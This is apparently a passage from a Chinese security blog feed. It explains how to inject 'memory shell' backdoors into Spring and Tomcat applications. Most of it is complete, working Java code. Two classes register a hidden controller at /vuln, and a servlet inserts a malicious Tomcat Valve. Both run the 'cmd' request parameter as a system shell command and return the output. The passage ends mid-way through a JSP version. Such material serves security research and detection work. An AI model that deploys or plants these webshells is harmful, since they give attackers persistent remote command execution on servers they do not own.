title="注册流程"></a>注册流程</h3><p>在registerMapping方法中存在三个参数，分别为handler、method和mapping。</p><ul><li>handler：需要构造的controller对应的类</li><li>method：需要注册的controller中的方法</li><li>mapping：RequestMappingInfo类型的，设置Controller的一些请求参数的，若没有特殊要求全填null即可<br>java<br>&#x2F;&#x2F; handler<br>InjectToController injectToController &#x3D; new InjectToController();<br>&#x2F;&#x2F; method<br>Method method &#x3D; InjectToController.class.getMethod(“vuln”);<br>&#x2F;&#x2F; mapping<br>RequestMappingInfo info &#x3D; new RequestMappingInfo(null, null, null, null, null, null, null);</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态注册Spring Controller内存马的具体思路如下：</p><ul><li>获取Context</li><li>获取RequestMappingHandlerMapping</li><li>获取MappingRegistry属性</li><li>构造RequestMappingInf</li><li>调用MappingRegistry#register方法注册Controller</li></ul><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于Springboot &lt; 2.6.0环境, 从Springboot 2.6.0版本开始, 官方修改了url路径的默认匹配策略</span></span><br><span class="line"><span class="comment"> * 需要通过application.properties配置文件设置spring.mvc.pathmatch.matching-strategy的值为ant_path_matcher</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell1</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestController</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 通过上下文获取RequestMappingHandlerMapping</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 获取恶意类的恶意方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义访问恶意Controller的url</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/vuln&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问恶意controller的HTTP请求方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 动态注册Controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">VulnController</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController</span>();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于SpringMVC+Tomcat的环境，以及Springboot 2.6+环境</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell2</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject2&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SpringControllerMemShell2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController2.class.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/vuln&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">VulnController2</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController2</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController2</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-Controller/1713493654995-1d7b2350-c810-4c90-8b70-b3f5d3aeb13d.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Valve</title>
      <link href="/2024/05/18/Tomcat-Valve/"/>
      <url>/2024/05/18/Tomcat-Valve/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在之前学习Listener内存马、Filter内存马和Servlet内存马时，下断点的调用栈中总有一个常见的字眼Valve，调用链中调用了很多与Valve相关的方法的invoke方法。</p><p><img src="/2024/05/18/Tomcat-Valve/1.png"></p><p>Valve翻译过来是阀门的意思。在Tomcat中，四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper中都有一个管道（PipeLine）及若干阀门（Valve）。</p><p>PipeLine伴随容器类对象生成时自动生成，就像容器的逻辑总线，按照顺序加载各个Valve，而Valve是逻辑的具体实现，通过PipeLine完成各个Valve之间的调用。在PipeLine生成时，同时会生成一个缺省Valve实现，就是在调试中经常看到的StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve。</p><p>Tomcat在处理一个请求调用逻辑时，为了整体架构的每个组件的可伸缩性和可扩展性，使用了职责链模式来实现客户端请求的处理。在Tomcat中定义了两个接口：Pipeline（管道）和Valve（阀门）。Pipeline中有一个最基础的Valve，它始终位于末端，最后执行，且封装了具体的请求处理和输出响应的过程。Pipeline提供了addValve方法，可以添加新Valve在BasicValve之前，并按照添加顺序执行。</p><p><img src="/2024/05/18/Tomcat-Valve/2.png"></p><p>Tomcat容器的四个子容器中都有基础的Valve实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），它们同时维护了一个Pipeline实例（StandardPipeline）。也就是说，可以在任何层级的容器上针对请求处理进行扩展，且这四个Valve的基础实现都继承了ValveBase。</p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>跟进一下上文最开始调用栈图中的org.apache.catalina.connector.CoyoteAdapter#service方法，该方法调用StandardEngine#getPipline方法来获取其Pipeline，接着获取Pipeline中的第一个Valve并调用该Valve的invoke方法。</p><p><img src="/2024/05/18/Tomcat-Valve/3.png"></p><p>跟进invoke方法，发现其调用的是org.apache.catalina.core.StandardEngineValve#invoke方法，StandardEngineValve继承了ValveBase，且在invoke方法中能拿到request和response。</p><p><img src="/2024/05/18/Tomcat-Valve/4.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Valve内存马的具体思路如下：</p><ol><li>继承并构造一个恶意的Valve；</li><li>获取StandardContext；</li><li>通过StandardContext获取当前容器的StandardPipeline；</li><li>调用StandardContext#addValve方法添加恶意Valve。</li></ol><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ValveMemoryShellServlet&quot;, value = &quot;/ValveMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        ((HttpServletResponse) response).getWriter().write(output);</span><br><span class="line">                        ((HttpServletResponse) response).getWriter().flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            standardContext.getPipeline().addValve(valveBase);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Valve Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Valve/5.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span 